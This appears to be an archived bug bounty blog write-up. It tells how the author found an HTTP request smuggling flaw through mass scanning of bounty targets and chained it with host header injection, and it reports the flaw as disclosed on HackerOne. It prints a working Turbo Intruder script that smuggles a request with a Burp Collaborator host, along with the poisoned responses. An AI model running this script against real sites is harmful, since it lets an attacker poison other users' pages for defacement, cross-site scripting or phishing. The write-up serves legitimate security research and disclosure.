---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-01-25_get-paid-by-smuggling-the-legal-way.md
original_filename: 2021-01-25_get-paid-by-smuggling-the-legal-way.md
title: Get paid by smuggling, the legal way
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- race-condition
- api-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- race-condition
- api-security
- supply-chain
language: en
raw_sha256: 78e0f9a2e62ae7399186e4bfe54be879cdf196ed23d402f02d37858dff88f15c
text_sha256: 2f098d3a52b5dd0e6cd3a77a3699d2a7d95c0e3d3c69363c8dc0bac1c317a9c2
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# Get paid by smuggling, the legal way

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-01-25_get-paid-by-smuggling-the-legal-way.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, race-condition, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `78e0f9a2e62ae7399186e4bfe54be879cdf196ed23d402f02d37858dff88f15c`
- Text SHA256: `2f098d3a52b5dd0e6cd3a77a3699d2a7d95c0e3d3c69363c8dc0bac1c317a9c2`


## Content

---
title: "Get paid by smuggling, the legal way"
url: "https://medium.com/bugbountywriteup/get-paid-by-smuggling-the-legal-way-c31805de3c59"
authors: ["James Ling (@James_puppykok)"]
bugs: ["HTTP request smuggling"]
publication_date: "2021-01-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3968
scraped_via: "browseros"
---

# Get paid by smuggling, the legal way

Get paid by smuggling, the legal way
The love story of Host Header Injection and HTTP Request Smuggling
James Ling
Follow
7 min read
·
Jan 26, 2021

53

As all of you smart and security-minded readers may have already known, boring bugs that have long been left in the dust, ignored by Google and most bug bounty programs, trampled on the ground, ignored. If you have been in a penetration testing career (or any related security consulting for that matter), vulnerabilities that requires all stars within the observable universe to align for a practical attack scenario are usually marked as informational, or low, depending on the demonstrated impact to the systems.

While these are generally flagged in a penetration testing report, most bug bounty programs generally do not issue payout for these bugs.

Just like a box that turns itself off, Informational findings are good to have in your penetration testing report so it looks less empty. This way, you will feel better about not finding vulnerabilities — or feel a sense of relief that your client’s systems are actually secure. What they think of your empty report, though, is another question.

Findings scored as Informational does not pose any immediate security risk and have no practical impact to Confidentiality, Integrity or Availability, but the respective remediations are considered to be Industrial best practices.

Just like a box that turns itself off , Informational findings are good to have to have in your penetration testing report so it looks less empty.

Useless box that turns itself off

What are these bugs? The following list a few:

Host header injection
Self Cross-Site scripting
TRACE HTTP method enabled
Outdated JavaScript Libraries

A chopstick breaks easily, but a bundle of them is hard to break. As boring as these vulnerabilities may be, they can be disastrous when chained with other vulnerabilities — I hope you get my horrible attempt at the analogy.

Okay enough ranting, let’s get straight to the story of my first ever paid bounty.

I will not elaborate on the details of HTTP Request Smuggling, as there are already many detailed and useful writeups out there on the Internet. If you are interested to find out more, I recommend that you read writeup by James Kettle and his research progress, from earliest to latest:

What is HTTP Request Smuggling?
HTTP Desync Attacks: Request Smuggling Reborn
HTTP Desync Attacks: what happened next
Breaking the chains on HTTP Request Smuggler

A whitepaper published by Watchfire as early as 2005 was published on this vulnerability, but James Kettle’s recent research ignited the security community’s interest in this particular vulnerability once again.

Basically, HTTP request smuggling is due to a disagreement on how different web servers or proxies interpret the Content-Length and Transfer-Encoding header, allowing an attacker to slip (or smuggle) an HTTP request from one server to another unnoticed.

Press enter or click to view image in full size

When James Kettle first published the article on HTTP Request Smuggling and the Burpsuite’s extension HTTP Request Smuggler that came along, it was coincidentally the first few months of my journey in Bug Bounty hunting.

I have also heard success stories of bug bounty hunters using a technique called “Spraying”. This means praying and spraying across multiple domains, focusing only on one particular vulnerability at a time, until you find one that is vulnerable.

I decided to do the same.

The Github repository by arkadiyt was used to present a list of all active bug bounty targets, which was then imported into BurpSuite using Burp-Importer, populating the site map. I set up BurpSuite to perform a rate-throttled crawl on the domains for 2 consecutive days. Subsequently, the results were filtered to remove 404s and all irrelevant content (e.g. JavaScript files) before running HTTP Request smuggler…… for another 2 days.

The first day went past, nothing.

On the second day, I woke up at around 10.30am in the morning to the sound of my computer fans whirring once again. I jumped out of bed and checked my screen. And there it was, a bright red question mark icon, as glaring as the morning sun.

Possible HTTP Request Smuggling

Although it could be a false positive, a rule of thumb to follow is to never assume that it is one unless it is manually verified.

Exploitation Process: Chaining HTTP Host Injection with HTTP Request Smuggling

Before I start, my disclosure request has already been graciously accepted by TTS Bug Bounty mid last year and you can find the report on HackerOne here:

Get James Ling’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://hackerone.com/reports/726773

Now that I get things out of the way, let’s start.

The turbo intruder script that came hand-in-hand with HTTP Request Smuggler was very useful, although it does require some manual tweaks depending on how you can further exploit the application.

I configured the script to smuggle a HTTP request with a host header value pointing to my Burp Collaborator as shown below:

import re

def queueRequests(target, wordlists):

  # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
  engine = RequestEngine(endpoint=target.endpoint,
  concurrentConnections=5,
  requestsPerConnection=1,
  resumeSSL=False,
  timeout=10,
  pipeline=False,
  maxRetriesPerRequest=0,
  engine=Engine.THREADED,
  )
  engine.start()

  prefix = '''POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

  chunk_size = hex(len(prefix)).lstrip("0x")
  attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
  content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
  attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
  engine.queue(attack)

  for i in range(14):
  engine.queue(target.req)
  time.sleep(0.05)

def handleResponse(req, interesting):
  table.add(req)

I went ahead and launched the smuggle probe.

B
oom! An outlier amongst the series of boring HTTP requests. At the same time, Burp collaborator received a pingback.

Smuggled HTTP Request caught on 5th row

My pupils dilated as the rush of excitement engulfed me, as this a very strong indicator that the attack succeeded.

The request issued by Turbo intruder is shown below, where I have outlined the smuggled request in red:

Press enter or click to view image in full size
Legitimate request (Yellow) and Smuggled request (red)

For some reason, the backend is utilizing the host header value and reflecting it within the user’s response. Chaining it with HTTP request smuggling would allow me to exploit other users instead of myself. The screenshot below shows 67 instances of the reflected value!

Press enter or click to view image in full size

The host header values were reflected all over the place, including JavaScript links, stylesheets references, and even menu-level redirections. A snippet of the server’s response is shown below, heavily snipped for your sanity.

<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16">

-snip-

<a class="dropdown-toggle local-link" data-toggle="dropdown" data-target="#" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/">Topics <b class="caret"></b></a>
<ul class="dropdown-menu topics">
  <li class="menu-agriculture topic-food"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/" class="local-link"><i></i><span>Agriculture</span></a></li>
  <li class="menu-climate topic-climate"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/" class="local-link"><i></i><span>Climate</span></a></li>
  <li class="menu-consumer topic-consumer"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/" class="local-link"><i></i><span>Consumer</span></a></li>

Are you thinking what I am thinking? The possibilities are endless, just to name a few:

Complete website UI and content defacement — Spreading misinformation and fear on a trusted website, phishing campaigns etc.
Cross-Site Scripting
Open redirection

This was me at that point in time.

One last step

Although I have almost confirmed this vulnerability, I made sure that it is exploitable over a different network by using my phone (connected on 4G) to ensure I get the same 404 page.

Why? You may ask.

An important footnote from Portswigger’s website on HTTP request smuggling states:

The “attack” request and the “normal” request should be sent to the server using different network connections. Sending both requests through the same connection won’t prove that the vulnerability exists.

Although there is no reason provided, my best-educated guess is that some devices or software in the network that you are testing from may be intercepting your traffic to and from the Internet, which may replicate behaviors you see in request smuggling vulnerabilities.

For example, a corporate reverse proxy may be manipulating your outbound HTTP requests, causing you to think you might have exploited the backend web server(s) when in fact, the internal reverse proxy was the culprit all along.

Endnote

In the event that you find a web application that is vulnerable to HTTP Request Smuggling, try to chain it to other vulnerabilities, such as Open redirection, cross-site scripting or even stealing of users’ data.

Try to see where the backend places the injected information within your request in the server’s response, and hack away.

The only limit is your imagination.

Stay frosty, and happy hacking!

If you like this article, be sure to follow my Twitter, or connect with me via LinkedIn.

LinkedIn: https://www.linkedin.com/in/jameslingyi/
Twitter: https://twitter.com/James_puppykok
